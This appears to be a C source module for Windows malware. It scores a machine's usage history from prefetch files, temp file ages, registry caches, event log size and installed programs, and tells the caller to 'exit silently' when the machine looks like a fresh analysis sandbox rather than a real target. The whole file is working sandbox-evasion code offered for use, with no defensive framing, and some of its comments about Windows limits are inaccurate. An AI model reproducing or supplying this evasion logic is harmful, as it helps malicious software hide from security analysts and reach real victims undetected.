/*
 * env_maturity.c — Machine maturity check
 *
 * A fresh sandbox image has almost no usage history even if it looks like
 * real hardware. Real machines accumulate digital footprints over weeks:
 * prefetch files for every program ever launched, temp files of various ages,
 * deep ShimCache/Amcache entries, and substantial event logs.
 *
 * This check is INDEPENDENT of VM detection — it doesn't look for VMware
 * artifacts. It only asks: "Has a human been using this machine for a while?"
 *
 * Scoring: each signal adds points. Low total = immature = likely sandbox.
 *
 * Return values (env_maturity_check):
 *   0 = mature enough    — proceed
 *   1 = machine too fresh — likely sandbox, exit silently
 */

#if defined(_WIN32)||defined(_WIN64)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* ── Helper: count files matching a wildcard pattern ─────────────────────── */
static int count_files(const char *pattern) {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    int count = 0;
    do { count++; } while (FindNextFileA(h, &fd));
    FindClose(h);
    return count;
}

/* ── 1. Prefetch file count ────────────────────────────────────────────────
 * Every program Windows ever launches leaves a .pf file in %SystemRoot%\Prefetch.
 * Fresh sandbox image: 5-15 files.
 * Real machine after weeks: 100-150 files (capped at 128 by Windows).
 * Score: 0 if <10, 1 if 10-29, 2 if 30-59, 3 if >=60
 */
static int score_prefetch(void) {
    char windir[MAX_PATH] = {0};
    GetWindowsDirectoryA(windir, MAX_PATH);
    char pattern[MAX_PATH + 16];
    snprintf(pattern, sizeof(pattern), "%s\\Prefetch\\*.pf", windir);
    int count = count_files(pattern);
    if (count < 10) return 0;
    if (count < 30) return 1;
    if (count < 60) return 2;
    return 3;
}

/* ── 2. Temp folder age spread ────────────────────────────────────────────
 * Real machines have temp files created over a wide time span (days to months).
 * Sandbox: all temp files were created within the last hour (same session).
 *
 * We sample up to 30 files from %TEMP%, compute oldest vs newest creation
 * time. If spread > 1 hour → machine has been used over time → score points.
 * Score: 0 if spread <1h, 1 if 1-24h, 2 if 1-7d, 3 if >7d
 */
static int score_temp_age_spread(void) {
    char tempdir[MAX_PATH] = {0};
    DWORD len = GetTempPathA(MAX_PATH, tempdir);
    if (len == 0) return 0;

    char pattern[MAX_PATH + 4];
    snprintf(pattern, sizeof(pattern), "%s*", tempdir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;

    ULARGE_INTEGER oldest, newest;
    oldest.QuadPart = ULLONG_MAX;
    newest.QuadPart = 0;
    int sampled = 0;

    do {
        if (fd.cFileName[0] == '.') continue;
        ULARGE_INTEGER ct;
        ct.LowPart  = fd.ftCreationTime.dwLowDateTime;
        ct.HighPart = fd.ftCreationTime.dwHighDateTime;
        if (ct.QuadPart > 0) {
            if (ct.QuadPart < oldest.QuadPart) oldest = ct;
            if (ct.QuadPart > newest.QuadPart) newest = ct;
        }
        sampled++;
        if (sampled >= 30) break;
    } while (FindNextFileA(h, &fd));
    FindClose(h);

    if (sampled < 3 || oldest.QuadPart >= newest.QuadPart) return 0;

    /* spread in seconds */
    ULONGLONG spread_s = (newest.QuadPart - oldest.QuadPart) / 10000000ULL;
    if (spread_s < 3600ULL)            return 0; /* < 1 hour  */
    if (spread_s < 86400ULL)           return 1; /* < 1 day   */
    if (spread_s < 7 * 86400ULL)       return 2; /* < 7 days  */
    return 3;                                      /* > 7 days  */
}

/* ── 3. ShimCache / Amcache entry count via registry ─────────────────────
 * AppCompatCache (ShimCache) in the registry records every executable that
 * has ever run on the system. Fresh sandbox: 10-30 entries.
 * Real machine: 500-1000+ entries.
 *
 * We count the number of values under the Amcache key instead (easier to
 * enumerate without parsing binary blobs):
 * HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Appraiser\Inventory
 *
 * Fallback: count subkeys under recent programs MRU.
 * Score: 0 if <20, 1 if 20-99, 2 if 100-299, 3 if >=300
 */
static int score_shimcache(void) {
    /* Try Amcache — a plain value count gives us a good proxy */
    static const char *amcache_keys[] = {
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Appraiser\\Inventory",
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers",
        NULL
    };
    int total_vals = 0;
    for (int k = 0; amcache_keys[k]; k++) {
        HKEY hk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, amcache_keys[k], 0, KEY_READ, &hk) != ERROR_SUCCESS)
            continue;
        DWORD nv = 0;
        RegQueryInfoKeyA(hk, NULL,NULL,NULL,NULL,NULL,NULL, &nv, NULL,NULL,NULL,NULL);
        RegCloseKey(hk);
        total_vals += (int)nv;
    }

    /* Also count MRU entries in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs */
    HKEY hmru;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
                      0, KEY_READ, &hmru) == ERROR_SUCCESS) {
        DWORD nv = 0;
        RegQueryInfoKeyA(hmru, NULL,NULL,NULL,NULL,NULL,NULL, &nv, NULL,NULL,NULL,NULL);
        RegCloseKey(hmru);
        total_vals += (int)nv;
    }

    if (total_vals <  20) return 0;
    if (total_vals < 100) return 1;
    if (total_vals < 300) return 2;
    return 3;
}

/* ── 4. Event log depth ────────────────────────────────────────────────────
 * Windows event logs grow continuously. Fresh sandbox: 500-2000 events.
 * Real machine running for weeks: 50,000-200,000+ events.
 *
 * We use GetNumberOfEventLogRecords on the System and Security logs.
 * Score: 0 if <1000, 1 if 1000-9999, 2 if 10000-49999, 3 if >=50000
 */
static int score_event_log(void) {
    const char *logs[] = { "System", "Security", "Application", NULL };
    DWORD total = 0;
    for (int i = 0; logs[i]; i++) {
        HANDLE h = OpenEventLogA(NULL, logs[i]);
        if (!h) continue;
        DWORD n = 0;
        GetNumberOfEventLogRecords(h, &n);
        CloseEventLog(h);
        total += n;
    }
    if (total <  1000) return 0;
    if (total < 10000) return 1;
    if (total < 50000) return 2;
    return 3;
}

/* ── 5. Installed programs count (quick proxy) ────────────────────────────
 * Real machines have 50-200 installed programs accumulated over time.
 * Fresh sandbox: 5-20 programs.
 * We count subkeys under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall.
 * Score: 0 if <10, 1 if 10-29, 2 if 30-59, 3 if >=60
 */
static int score_installed_programs(void) {
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hk) != ERROR_SUCCESS) return 0;
    DWORD nsk = 0;
    RegQueryInfoKeyA(hk, NULL,NULL,NULL, &nsk, NULL,NULL,NULL,NULL,NULL,NULL,NULL);
    RegCloseKey(hk);

    /* Also count 32-bit hive */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        DWORD n2 = 0;
        RegQueryInfoKeyA(hk, NULL,NULL,NULL, &n2, NULL,NULL,NULL,NULL,NULL,NULL,NULL);
        RegCloseKey(hk);
        nsk += n2;
    }

    if (nsk <  10) return 0;
    if (nsk <  30) return 1;
    if (nsk <  60) return 2;
    return 3;
}

/*
 * env_maturity_check(min_score)
 *
 * Runs all maturity signals and sums their scores.
 * Maximum possible score: 5 signals × 3 points = 15.
 *
 * min_score: minimum acceptable score (suggested: 4)
 *   → A machine scoring < 4 is likely a freshly provisioned sandbox.
 *   → Conservative enough to avoid false positives on newly built targets.
 *
 * Returns:
 *   0 = mature   (score >= min_score) — proceed
 *   1 = immature (score <  min_score) — exit silently
 */
int env_maturity_check(int min_score) {
    int score = 0;
    score += score_prefetch();
    score += score_temp_age_spread();
    score += score_shimcache();
    score += score_event_log();
    score += score_installed_programs();
    return (score >= min_score) ? 0 : 1;
}

#else  /* Non-Windows stub */

int env_maturity_check(int min_score) {
    (void)min_score;
    return 0; /* not applicable outside Windows — always pass */
}

#endif
